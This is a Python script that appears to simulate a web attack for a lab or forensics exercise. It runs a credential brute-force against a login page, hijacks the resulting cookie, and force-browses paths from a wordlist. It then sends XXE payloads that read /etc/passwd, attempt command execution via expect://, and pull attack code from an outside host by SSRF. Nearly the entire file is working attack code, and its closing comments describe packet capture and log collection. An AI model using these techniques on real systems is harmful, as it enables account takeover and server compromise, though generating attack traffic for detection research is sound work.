#!/usr/bin/env python3
import requests
import random
from icecream import ic
from time import sleep

# setup stuff
URLsUgly = open("urls.txt","r").readlines()
URLs = []
for line in URLsUgly:
    URLs.append(line.strip())

userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.37) Gecko/20100101 Firefox/12.0"
header = {'User-Agent': userAgent}

# wait for the site to come online
sitesUp = False
while not sitesUp == 200:
    try:
        req = requests.get(URLs[0])
        sitesUp = req.status_code
        ic(sitesUp)
        sleep(5)
    except Exception as ex:
        ic(ex)
        sleep(5)

# give normal traffic a minute
sleep(60)

# browse a bit
for i in range(12):
    try:
        req = requests.get(random.choice(URLs), headers=header)
        ic(req.content)
    except Exception as ex:
        ic(ex)
    sleep(random.randint(1,5))

# attack the login
goodCreds = []
tryCount = 0
loginURL = [i for i in URLs if "login" in i][0] # grab the URL with "login" in it
for user in open("users.txt","r").readlines(): # iterate through a username list
    for password in open("passwords.txt","r").readlines(): # iterate through a password list
        payload = {'username': user.strip(),'password':password.strip()} # try the user:pass combo
        attempt = requests.post(loginURL, headers=header, data=payload, allow_redirects=False)
        tryCount += 1
        if attempt.status_code == 302: # on this site, 302 indicates success
            goodCreds.append(payload)

ic (goodCreds, tryCount)
sleep(30)

# payload = {'username': 'bob','password':'passw0rd'}
# attempt = requests.post(loginURL, headers=header, data=payload, allow_redirects=False)
# attempt.status_code

# grab a cookie from the good creds
payload = {'username': goodCreds[0]["username"],'password':goodCreds[0]["password"]}
attempt = requests.post(loginURL, headers=header, data=payload, allow_redirects=False)
cookie = attempt.cookies.keys()[0] + "=" + attempt.cookies[attempt.cookies.keys()[0]]
header["Cookie"]=cookie # add cookie to subsequent requests
ic(header)

sleep(30)
# brute force browsing
dirbsUgly = open("dirb.txt","r").readlines()
dirbs = []
for line in dirbsUgly:
    dirbs.append(line.strip())

forcedPaths = []
for dirb in dirbs:
    attempt = requests.get(URLs[0] + dirb, headers=header, allow_redirects=False)
    if attempt.status_code != 404: # if it's not a 404, add it to our list of known good URLs
        forcedPaths.append(dirb)

ic(forcedPaths)

sleep(30)

# oh, what's in /proc??
attempt = requests.get(URLs[0] + forcedPaths[0], headers=header)
ic(attempt.content)

sleep(10)

xmlGetPasswd = b"""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
"""

xmlRunCmd = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY id SYSTEM "expect:///id"> ]>
<product><productId>&id;</productId></product>
"""

xmlSSRF1 = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://4.icanhazip.com/"> ]>
<product><productId>&id;</productId></product>
"""

xmlSSRF2 = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://www.pastaarmy.com:8000/attack.xml"> ]>
<product><productId>&id;</productId></product>
"""

header['Content-Type'] = 'application/xml' # required header for sending XML

# try to just run a command; fails
attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlRunCmd)
ic(attempt.content)

sleep(5)

# LFI to grab local file - succeeds!
attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlGetPasswd)
ic(attempt.content)

sleep(5)

# get the victim's public IP
attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF1)
ic(attempt.content)

sleep(5)

# pull attack code from pastaarmy.com
attempt = requests.post(URLs[0] + forcedPaths[0], headers=header, data=xmlSSRF2)
ic(attempt.content)

sleep(60)


# check out command injection
# try:
#     req = requests.get(URLs[0] + "maintenance.html?cmd=id", headers=header)
#     ic(req.content)
# except Exception as ex:
#     ic(ex)


# On attacker:
# journalctl -f -u webattacker.service

# On webserver:
# tcpdump -i eth0 '(tcp or udp) and not port 22 -w - | tee /home/ubuntu/victim.pcap | tcpdump -r - -nnv'
# aws s3 cp /home/ubuntu/victim.pcap s3://hammer-bucket8675309/
# aws s3 cp /var/log/weberror.log s3://hammer-bucket8675309/

# Locally:
# aws s3 cp s3://hammer-bucket8675309/weberror.log . --profile hammer-deploy
# aws s3 cp s3://hammer-bucket8675309/victim.pcap . --profile hammer-deploy
